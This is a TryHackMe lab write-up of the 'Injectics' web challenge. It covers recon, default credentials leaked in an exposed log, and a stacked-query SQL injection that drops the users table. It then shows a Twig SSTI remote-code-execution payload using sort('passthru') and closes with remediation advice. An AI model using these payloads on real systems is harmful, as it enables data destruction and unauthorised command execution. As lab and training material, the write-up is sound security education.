# Injectics Challenge — TryHackMe / Web Application Pentesting  
**Date:** 2025-10-29  
**Type:** TryHackMe (Challenge)  
**Scope:** Lab / Authorized only  

---

## 1) Context
This challenge simulated a realistic multi-stage attack chain combining **SQL Injection**, **automated recovery logic abuse**, and a **Server-Side Template Injection (SSTI)** in a vulnerable Twig version.  
Goal: compromise the application by chaining vulnerabilities and extracting both flags.

---

## 2) Initial hypothesis
When I started, I suspected a **classic SQL injection** due to the `/login.php` page and developer comments about database recovery.  
I expected to leverage the recent injection concepts learned (SQLi, ORM injection, SSTI).  
Key question: *Can I manipulate the recovery service or leverage SQLi beyond just credential dumping?*

---

## 3) Tools used
- **Nmap** → port discovery  
- **Gobuster / ffuf** → directory enumeration  
- **Burp Suite** → payload crafting and testing  
- **Browser** → behavioral observation  
- **PayloadsAllTheThings** → Twig exploit reference  

---

## 4) Approach (high level)
1. Recon and enumeration with Nmap & Gobuster  
2. Locate potential injection in `/login.php`  
3. Identify auto-recovery behavior in `mail.log`  
4. Trigger Injectics recovery by dropping `users` table via SQLi  
5. Log in using restored default credentials  
6. Enumerate admin panel → confirm SSTI  
7. Exploit Twig 2.14.0 vulnerability for RCE → retrieve flag  

---

## 5) Results / Evidence (sanitized)

### Recon and enumeration
- **Nmap**
```bash
  nmap -p- 10.10.49.174
```
- Ports open: 22/tcp (SSH), 80/tcp (HTTP)
### Gobuster
```bash
gobuster dir -u http://10.10.49.174 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,log
```
- Discovered /login.php, /mail.log, /flags, /vendor/, /composer.json

### Key findings
- mail.log exposed default credentials used by the InjecticsService (auto-restoration daemon):
```bash
superadmin@injectics.thm : superSecurePasswd101
dev@injectics.thm : devPasswd123
```
- composer.json → Twig 2.14.0 (known SSTI RCE vulnerability).

### SQL Injection → Triggering auto-recovery
1. Confirmed SQLi on /login.php with ' OR 1=1--
2. Identified ; was allowed, enabling stacked queries.
3. Used payload:
```sql
    2;DROP+TABLE+users;
```
- App response:
    - “Seems like database or some important table is deleted. InjecticsService is running to restore it.”
4. Waited ~2 minutes → default credentials reappeared.
    - Logged in as superadmin → Flag #1 obtained.

### Twig SSTI exploitation
- Test payload confirmed template evaluation:
```bash
    {{ 7*7 }} → 49
```
- Used Twig sort('passthru') exploit (CVE-2022-23614):
```bash
    {{ ['ls flags','']|sort('passthru')|join }}
```
- Listed: 5d8af1dc14503c7e4bdc8e51a3469f48.txt
- Retrieved final flag:
```bash
    {{ ['cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt','']|sort('passthru')|join }}
```
- Flag #2 captured.

## 6) Recommended remediation

- **Use parameterised queries** and **disable multiple statements execution** (prevent stacked queries).
- **Validate and sanitize user input**; reject special characters like `;`, quotes (`'`, `"`), and comment operators (`--`, `#`).
- **Restrict service privileges**: the auto-recovery daemon should **not** recreate admin users with default or hardcoded credentials.
- **Secure Twig configuration**:
  - Upgrade Twig to **> 3.x**.
  - Enable strict sandboxing for templates.
- **Hide sensitive files** (e.g., `mail.log`, `composer.json`) from web access — move them outside the webroot or restrict access via server config.
- **Review application logic** to avoid predictable recovery or debugging mechanisms in production (avoid auto-seeding privileged accounts).

---

## 7) Lessons learned

- **SQLi can be leveraged for more than data dumping** — here it was used to trigger a recovery system.
- **Auto-recovery processes can become escalation vectors** if they use hardcoded or predictable default credentials.
- **Twig SSTI (vulnerable versions)** can enable RCE via filters like `sort('passthru')`.
- **Chaining vulnerabilities** is powerful and often necessary for full compromise:  
  `SQLi → privilege escalation → SSTI → RCE`.
- **Developer artifacts leak danger**: logs, comments, and `.json` files often reveal versions, credentials, or architecture hints.

---

## 8) Links / Resources

- TryHackMe — *Web Application Pentesting* (Challenge)  
- Twig 2.14.0 CVE Reference: **CVE-2022-23614**  
- PayloadsAllTheThings — SSTI / Twig Exploits  
- Notion / detailed write-up (public): *(add link here if applicable)*
